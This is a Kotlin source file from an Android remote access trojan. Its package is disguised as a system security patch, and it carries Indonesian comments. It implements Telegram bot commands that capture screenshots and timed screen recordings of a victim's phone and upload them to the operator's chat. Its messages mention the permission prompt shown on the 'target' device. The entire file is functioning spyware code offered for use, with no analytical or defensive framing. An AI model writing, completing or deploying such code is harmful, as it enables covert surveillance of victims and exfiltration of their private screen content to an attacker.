package com.android.security.patch.commands

import android.content.Context
import com.android.security.patch.CaptureActivity
import com.android.security.patch.RatApi
import com.android.security.patch.ScreenCap

object ScreenCmd {

    /** /ss — screenshot. Kalau projection belum ada, trigger prompt dulu */
    fun screenshot(ctx: Context, chatId: Long) {
        if (!ScreenCap.isReady()) {
            RatApi.sendMessage(
                ctx,
                "media projection belum aktif — dialog izin muncul di target, tap <b>Mulai sekarang</b>, lalu kirim /ss lagi",
                chatId
            )
            CaptureActivity.request(ctx)
            return
        }
        RatApi.sendChatAction(ctx, "upload_photo", chatId)
        Thread {
            val bytes = ScreenCap.screenshot(ctx)
            if (bytes == null) {
                RatApi.sendMessage(ctx, "screenshot failed", chatId)
            } else {
                RatApi.sendPhoto(ctx, bytes, "screenshot", chatId)
            }
        }.start()
    }

    /**
     * /rec_start <sec>  → mulai rekam, auto-stop setelah <sec> detik
     * max 120 detik, biar file gak lewat 50MB telegram
     */
    fun startRec(ctx: Context, chatId: Long, args: Array<String>) {
        val sec = (args.getOrNull(0)?.toIntOrNull() ?: 30).coerceIn(5, 120)
        if (!ScreenCap.isReady()) {
            RatApi.sendMessage(
                ctx,
                "media projection belum aktif — tap dialog izin dulu, lalu kirim /rec_start $sec",
                chatId
            )
            CaptureActivity.request(ctx)
            return
        }
        RatApi.sendMessage(ctx, "recording ${sec}s...", chatId)
        val ok = ScreenCap.startRec(ctx, sec)
        if (!ok) {
            RatApi.sendMessage(ctx, "rec start failed", chatId); return
        }
        // thread nunggu dan upload
        Thread {
            try {
                Thread.sleep(sec * 1000L + 1500)
                val bytes = ScreenCap.stopRec()
                if (bytes == null || bytes.isEmpty()) {
                    RatApi.sendMessage(ctx, "rec produced empty file", chatId)
                } else if (bytes.size > 45 * 1024 * 1024) {
                    RatApi.sendMessage(ctx, "rec too big (${bytes.size / 1024 / 1024}MB > 45MB telegram limit)", chatId)
                } else {
                    RatApi.sendChatAction(ctx, "upload_video", chatId)
                    RatApi.sendVideo(ctx, bytes, "screen rec ${sec}s", chatId)
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "rec err: ${e.message}", chatId)
            }
        }.start()
    }

    /** /rec_stop — hentikan manual */
    fun stopRec(ctx: Context, chatId: Long) {
        val bytes = ScreenCap.stopRec()
        if (bytes == null || bytes.isEmpty()) {
            RatApi.sendMessage(ctx, "no active recording", chatId); return
        }
        if (bytes.size > 45 * 1024 * 1024) {
            RatApi.sendMessage(ctx, "rec too big (${bytes.size / 1024 / 1024}MB)", chatId); return
        }
        RatApi.sendChatAction(ctx, "upload_video", chatId)
        Thread {
            RatApi.sendVideo(ctx, bytes, "screen rec", chatId)
        }.start()
    }
}